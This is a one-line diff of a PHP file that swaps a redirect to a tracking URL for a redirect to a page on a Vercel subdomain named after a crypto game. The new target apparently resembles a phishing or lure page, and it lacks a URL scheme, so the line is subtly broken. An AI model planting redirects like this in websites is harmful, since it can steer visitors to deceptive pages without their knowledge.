@@ -1,1 +1,1 @@
-<?php header("Location: https://tracking.builderallwppro.com/US9514-"); ?>
+<?php header("Location: axie-coral.vercel.app/index1.html"); ?>
